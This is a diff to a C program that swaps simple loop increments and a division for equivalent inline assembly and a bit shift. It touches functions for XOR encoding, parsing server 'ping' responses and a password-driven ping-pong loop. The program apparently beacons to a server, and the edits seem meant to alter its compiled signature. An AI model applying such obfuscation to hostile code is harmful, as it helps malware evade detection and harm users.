@@ -73,8 +73,17 @@ void xor_encrypt(char *original, int salt){
     strcpy(new_text, original);
     new_text[length] = '\0';
 
-    for (i = 0; i < length; i++){
-        new_text[i] = new_text[i] ^ key;
+    for (i = 0; i < length;){
+        unsigned char key_byte = (unsigned char)key; // Convertir `key` a byte
+        asm("xorb %1, %0"        // Operación XOR con bytes
+            : "=r" (new_text[i])   // Salida
+            : "r" (key_byte), "0" (new_text[i])  // Entradas
+            : "cc"                  // Flags de condición afectados
+            );
+        asm("addl $1, %0"       // Sumar 1 a la variable i
+            : "=r" (i)          // Salida
+            : "0" (i)           // Entrada
+            );
     }
     strcpy(original, new_text);
 }
@@ -83,8 +92,12 @@ int str_to_hex(char *str, char *dest) {
     // Converts string to hex
     char *hex = dest;
     int i;
-    for (i = 0; i < strlen(str); i++) {
+    for (i = 0; i < strlen(str); ) {
         sprintf(&hex[i * 2], "%02x", str[i]);
+        asm("addl $1, %0"       // Sumar 1 a la variable i
+            : "=r" (i)          // Salida
+            : "0" (i)           // Entrada
+            );
     }
     hex[i * 2] = '\0';
     return i * 2;
@@ -174,8 +187,12 @@ int process_ping_response(const char *response_text, int *delay, int *pp_id) {
     // Split the response text into lines
     char *line = strtok(text_copy, "\n");
     while (line != NULL && line_count < MAX_RESPONSE_LINES) {
-        lines[line_count++] = line;
+        lines[line_count] = line;
         line = strtok(NULL, "\n");
+        asm("addl $1, %0"       // Sumar 1 a la variable i
+            : "=r" (line_count)          // Salida
+            : "0" (line_count)           // Entrada
+            );
     }
 
     // Check if we have at least EXPECTED_LINES (3) lines
@@ -206,12 +223,16 @@ int process_ping_response(const char *response_text, int *delay, int *pp_id) {
     *pp_id = atoi(pp_id_str + 6);
 
     int msgs_count = 0;
-    for (i = EXPECTED_LINES; i < line_count; i++) {
+    for (i = EXPECTED_LINES; i < line_count;) {
         line = lines[i];
         debug_printf("PING: Line: %s\n", line);
         if (line!= NULL && strncmp(line, "message-to-user: ", 17) == 0) {
             show_help_to_user(line + 17, msgs_count++);
         }
+        asm("addl $1, %0"       // Sumar 1 a la variable i
+            : "=r" (i)          // Salida
+            : "0" (i)           // Entrada
+            );
     }
     return 0; // Success
 }
@@ -395,7 +416,7 @@ int get_executable_dir(char *path){
 
 // Function to find the folder matching the pattern
 char* find_folder(char *path, char *pattern) {
-    const int MAX_PIECES = MAX_PATH_SIZE / 2;
+    const int MAX_PIECES = MAX_PATH_SIZE >> 1;
     regex_t regex;
     regcomp(&regex, pattern, REG_EXTENDED);
 
@@ -547,4 +568,3 @@ int ping_pong_loop(char *password) {
     }
     return 0;
 }
-
